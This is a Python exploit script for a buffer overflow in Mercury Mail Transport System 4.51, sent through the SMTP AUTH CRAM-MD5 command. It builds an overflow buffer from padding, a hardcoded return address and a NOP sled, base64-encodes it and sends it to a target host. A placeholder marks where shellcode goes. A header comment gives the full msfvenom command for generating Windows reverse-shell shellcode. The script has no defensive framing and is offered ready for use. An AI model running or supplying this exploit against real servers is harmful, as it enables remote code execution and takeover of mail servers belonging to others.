# Generaate reverse shell shellcode.
# msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT EXITFUNC=thread -b "\x00\x0a\x0d\x20\x25" -f python

import socket
import base64
import struct
import sys

def usage():
    print(f"Usage: {sys.argv[0]} <target_ip> <target_port>")
    print("Example:")
    print(f"  {sys.argv[0]} 192.168.108.112 25")
    sys.exit(1)

def exploit(target_ip, target_port):
    try:
        # Create socket connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, int(target_port)))
    except socket.error as e:
        print(f"Socket error: {e}")
        sys.exit(1)

    try:
        # Initial communication with the SMTP server
        sock.recv(1024)
        sock.send(b"EHLO\r\n")
        sock.recv(1024)

        # Send the AUTH CRAM-MD5 command
        sock.send(b"AUTH CRAM-MD5\r\n")
        sock.recv(1024)

        # Construct the malicious buffer
        ret_addr = 0x258d0d1e  # Return address for Mercury Mail Transport System 4.51
        payload = b"\x90" * 100 + b"YOUR_SHELLCODE_HERE"  # Replace with your actual payload
        buffer = b"A" * 204 + struct.pack("<L", ret_addr)
        buffer += payload + b"B" * (1075 - len(payload))

        # Encode the buffer in Base64
        sploit = base64.b64encode(buffer)

        print(f"Trying target with return address {hex(ret_addr)}...")
        sock.send(sploit + b"\r\n")

        # Wait for the payload to execute
        sock.recv(1024)
    except Exception as e:
        print(f"An error occurred during the exploit: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        usage()

    target_ip = sys.argv[1]
    target_port = sys.argv[2]

    try:
        # Validate IP address format
        socket.inet_aton(target_ip)
    except socket.error:
        print(f"Invalid IP address: {target_ip}")
        sys.exit(1)

    try:
        # Validate port number
        port = int(target_port)
        if port < 1 or port > 65535:
            raise ValueError("Port number out of range")
    except ValueError as e:
        print(f"Invalid port number: {target_port}. {e}")
        sys.exit(1)

    exploit(target_ip, target_port)
